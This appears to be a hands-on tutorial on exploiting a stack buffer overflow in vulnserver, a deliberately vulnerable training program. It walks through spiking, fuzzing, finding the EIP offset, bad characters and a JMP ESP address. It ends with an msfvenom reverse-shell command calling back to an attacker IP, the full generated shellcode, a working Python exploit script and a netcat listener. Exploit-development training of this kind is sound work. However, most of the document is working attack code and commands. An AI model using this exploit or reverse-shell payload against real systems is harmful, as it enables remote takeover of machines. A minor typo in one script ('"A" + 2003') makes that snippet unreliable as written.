In memory at the top is the kernel, at the bottom is text readable text. Right before the kernel we have the stack.
Under normal conditions the stack has a buffer that we can send data to an extended base pointer (EBP) and at the bottom an extended instruction pointer (EIP). If we send enough data into the stack we can land at the EIP which is the return address in memory. That return address can be our instructions (malicious code).
There are several techniques we can use to achieve this.
1. Spiking - Method used to find a vulnerable part of a program
2. Fuzzing - Sends multiple characters at a program to see if we can break it
3. Finding the Offset - Here we identify at what point did we break the program during fuzzing
4. Overwrite the EIP - We use the offset to overwrite the EIP
5. Find Bad Characters - After we have control of the EIP we need to clean up
6. Find right module - We try to find DLLs or Shared Objects with no memory protections
7. Generating shellcode - Msvenom can generate our shellcode based on our discoveries

We will then use what we learn in steps 5 and 6 to help generate the shellcode needed to compromise the target. When we point the EIP to our malicious shellcode, we should be able to get admin access. This assumes that the binary we are targeting would be running with admin privileges. The debugging tool I am using is Immunity Debugger, as well as Python 2.7.18
I am practicing against vulnserver:

```
https://github.com/stephenbradshaw/vulnserver.git
https://www.immunityinc.com/products/debugger/
https://www.python.org/downloads/release/python-2718/
```
# Spiking
By default vulnserver listens on port 9999 you can connect to it from your attacking machine using netcat:
```
nc -nv <vulnserver-host> <vulnserver-port>
nc -nv 192.168.0.10 9999
```
On connection we have several commands, but how do we know which of the functions in this application are vulnerable?
This is where spiking comes in. We will select each command and throw as many characters as we can at it to see if we can get a buffer overflow error. If it does we know that that particular function is vulnerable. In this example we can use a tool called Generic Send TCP it should already be installed on a system like kali linux
```
generic_send_tcp <hostname> <port> <spike_script> <Skip Variable> <Skip String>
generic_send_tcp 192.168.0.10 9999 stats.spk 0 0
```

stats.spk
```
s_readline();
s_string("STATS ");
s_string_variable("0");
```

trun.spk
```
s_readline();
s_string("TRUN ");
s_string_variable("0");
```
When running the trun.spk we should see an Access Violation exception in Immunity Debugger. By looking at the registers we can get some information. In the EAX we should see a lot of 'A' characters, it has overflown over the ESP and into the EBP, where we should continuously see '41' which is hex code for the character A, indicating a buffer overflow.
The EIP is the important factor, the fact that we have overwritten characters into this register indicates a vulnerability that can be exploited.

# Fuzzing
We can use python to fuzz this server as well and hopefully find the EIP location. During spiking we try to hit as many commands and functions as possible to discover a vulnerability, during fuzzing we have identified a possible vulnerability and try to glean information about what is happening in memory. If vulnserver crashes with ImmunityDebugger (IDB) attached then just restart both processes rather than trying to reattach to avoid errors.
During spiking when looking at the registers we saw that there are characters that are added before the command in order for the program to understand it.
```
TRUN /.:/
```
We are trying to narrow down, where it is breaking and at what specific byte size during fuzzing.
We can see that the fuzzing crashes at 2100 bytes. We must find where the EIP is.

# Finding The Offset
Within the Metasploit framework we can use the 'pattern create' tool
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <buffer_size>
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2500
```
Buffer size above should be approximately the byte size we discovered during fuzzing.
If we go further and launch the offset_fuzz.py script with a pattern created of size 2500 we see that we have crossed too far past the ESP into the EBP and even the EIP. However we do see a value in the EIP of 386F4337.
We are interested in this value, so lets see how to use it.
```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <buffer_size> -q <eip_value>
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2500 -q 386F4337

[*] Exact match at offset 2003
```
This tells us that at 2003 bytes we can control the EIP, we will try to overwrite it with very specific bytes to see if they show up in memory.
The EIP itself is 4 bytes long.
```
#!/usr/bin/python
import sys
import socket
# Python 2 version of this script

shellcode = "A" + 2003 + "B" * 4
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.0.10', 9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close()
except:
    print("Error while connecting to server")
    sys.exit()
```
In the above snipped we send 2003 'A's because this is where the EIP starts. We don't want to overwrite the EIP with 'A's so we should se "42424242" in the EIP. We must then find bad the bad characters before we smuggle in the shellcode.
# Finding Bad Characters
We must find bad characters in relation to shellcode, during generation we must know which characters are good or bad.
We do this by running all the hex code characters through our program and seeing if any of them act up. By default the null byte 'x00/' acts up.
```
https://github.com/cytopia/badchars
pip install badchars

# For Python:
badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
```
Depending on the program certain characters may correlate to some other command, therefore we must test the program with the badchars so that when generating shell code we know to avoid the specific bad characters we see.
Now we are interested at looking at the hexdump, we can look at the ESP by clicking on the register and then right-clicking and selecting "follow in dump" in Immunity.
The last thing we sent was FF so we begin looking in between both the beginning and end of the bad chars we sent and see if anything is out of place.
In this particular example using vulnserver there are no badchars because it was made to be learned from. If there were a bad character, it would not make sense for it to be at it's location.
For example if you were to see 10, 11, and then 13 instead of 12 it would be likely that 12 would be a bad character.
You can easily identify them in Immunity because they will look like a stripped horizontal tile in the hexdump.
You would write down all the chars you are missing that would be out of place in the hexdump and exclude them when generating the shellcode.
Be careful that you don't actually not a badchar that is in the correct place just because it may reappear somewhere else for example, if B0 is appearing multiple times in the hexdump it may not necessarily need to be excluded, only if it is out of place.
If you see consecutive bad characters only the first badchar would need to be excluded.
In such an example of consecutive bad chars the shellcode will still run fine in most cases but its good to know.
# Finding The Right Module
What we mean by finding the right module, is looking for a DLL or something similar in the program that has no memory protections.
This means no DEP, no ALSLR, no SafeSEH.
We can use a tool called Mona Modules with Immunity Debuger to acheive this.
```
https://github.com/corelan/mona
```
Place the mona.py file in the ImmunityDebugger 'PyCommands' folder wherever you have it installed.
```
C:/Program Files(x86)/Immunity Inc/Immunity Debugger/PyCommands
```
In the bar at the bottom of ImmunityDebugger you can type:
```
!mona modules
```
We are searching for something attached to the vulnserver that has no protections across the board for Rebase, SafeSEH, ASLR, NXCompat, OS DLL
We can see that essfunc.dll is an excellent choice. We also must know the opcode equivalent of a JMP we can use nasm_shell to help us.
```
locate nasm_shell
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
```
What we need in terms of an opcode equivalence is we need to convert assembly language into hex code. We are going to use this JMP as a pointer to our shellcode.
```
nasm> JMP ESP
00000000  FFE4
```
The hex equivalent of JMP ESP is FFE4. Now in ImmunityDebugger we will use
```
!mona find -s "\xff\xe4" -m essfunc.dll
```
After the scan completes we are looking for return addresses for example:

```
0x625011af
0x625011bb
0x625011c7
0x625011d3
0x625011df
0x625011eb
0x625011f7
0x62501203
0x62501205
```
It's important to remember we want the return address with no memory protections. Instead of placing the 4 'B's we used to mark the EIP we will place the hex code of the return address of the vulnerable area of memory.
```
shellcode = "A" * 2003 + "\xaf\x11\x50\x62"
```
Notice that the bytes are placed in reverse, whenever we are working with x86 architechture we are working in little endian format.
First in ImmunityDebugger we will need to select the "Go to address in Disassembler" button, we will then go to 0x625011af.
Then press f2 to set a breakpoint (Or right click it and select toggle) the memory address should become bright blue.
We should see that Immunity has paused the program and we have hit our breakpoint.
We also should see in the EIP register that the EIP is in 0x625011af, this indicates we have full control of the EIP, all we need to do is generate shellcode and point to it.

# Generating the Shellcode
The moment we have all been waiting for. Now that all the hard work has been done we can generate our shellcode with the following command:
```
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> EXITFUNC=thread -f c -a x86 -b "\x00"
msfvenom -p windows/shell_reverse_tcp LHOST=172.17.109.60 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
```
When generating this shellcode remember we would need to use the '-b' flag to avoid all of the bad characters.
It is important to keep note of the payload size because it is extremely important in exploit development. You must be sure there is sufficient space in memory for your exploit.
After the JMP instruction that places the EIP into the unprotected memory area we then have the EIP continue into our overflow using a NOP ('\x90')sled.

```
#!/usr/bin/python
import sys
import socket
# Python 2 version of this script

overflow = (
"\xbf\x22\xed\x7d\xab\xdb\xd3\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x52\x31\x78\x12\x03\x78\x12\x83\xca\x11\x9f\x5e\xf6\x02\xe2"
"\xa1\x06\xd3\x83\x28\xe3\xe2\x83\x4f\x60\x54\x34\x1b\x24\x59"
"\xbf\x49\xdc\xea\xcd\x45\xd3\x5b\x7b\xb0\xda\x5c\xd0\x80\x7d"
"\xdf\x2b\xd5\x5d\xde\xe3\x28\x9c\x27\x19\xc0\xcc\xf0\x55\x77"
"\xe0\x75\x23\x44\x8b\xc6\xa5\xcc\x68\x9e\xc4\xfd\x3f\x94\x9e"
"\xdd\xbe\x79\xab\x57\xd8\x9e\x96\x2e\x53\x54\x6c\xb1\xb5\xa4"
"\x8d\x1e\xf8\x08\x7c\x5e\x3d\xae\x9f\x15\x37\xcc\x22\x2e\x8c"
"\xae\xf8\xbb\x16\x08\x8a\x1c\xf2\xa8\x5f\xfa\x71\xa6\x14\x88"
"\xdd\xab\xab\x5d\x56\xd7\x20\x60\xb8\x51\x72\x47\x1c\x39\x20"
"\xe6\x05\xe7\x87\x17\x55\x48\x77\xb2\x1e\x65\x6c\xcf\x7d\xe2"
"\x41\xe2\x7d\xf2\xcd\x75\x0e\xc0\x52\x2e\x98\x68\x1a\xe8\x5f"
"\x8e\x31\x4c\xcf\x71\xba\xad\xc6\xb5\xee\xfd\x70\x1f\x8f\x95"
"\x80\xa0\x5a\x39\xd0\x0e\x35\xfa\x80\xee\xe5\x92\xca\xe0\xda"
"\x83\xf5\x2a\x73\x29\x0c\xbd\xd0\xbf\x63\x01\x41\xc2\x7b\x68"
"\xcd\x4b\x9d\xe0\xfd\x1d\x36\x9d\x64\x04\xcc\x3c\x68\x92\xa9"
"\x7f\xe2\x11\x4e\x31\x03\x5f\x5c\xa6\xe3\x2a\x3e\x61\xfb\x80"
"\x56\xed\x6e\x4f\xa6\x78\x93\xd8\xf1\x2d\x65\x11\x97\xc3\xdc"
"\x8b\x85\x19\xb8\xf4\x0d\xc6\x79\xfa\x8c\x8b\xc6\xd8\x9e\x55"
"\xc6\x64\xca\x09\x91\x32\xa4\xef\x4b\xf5\x1e\xa6\x20\x5f\xf6"
"\x3f\x0b\x60\x80\x3f\x46\x16\x6c\xf1\x3f\x6f\x93\x3e\xa8\x67"
"\xec\x22\x48\x87\x27\xe7\x68\x6a\xed\x12\x01\x33\x64\x9f\x4c"
"\xc4\x53\xdc\x68\x47\x51\x9d\x8e\x57\x10\x98\xcb\xdf\xc9\xd0"
"\x44\x8a\xed\x47\x64\x9f")

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.0.10', 9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close()
except:
    print("Error while connecting to server")
    sys.exit()
```
NOPs are padding, standing for No Operation. Without a NOP sled its possible our overflow might not actually work and we may not get command execution on the target because of some interference.
In situations where there is limited space for the exploit, you may have to adjust the NOP amount.
We also must set up a listener for our shellcode.
```
nc -nvlp 4444
```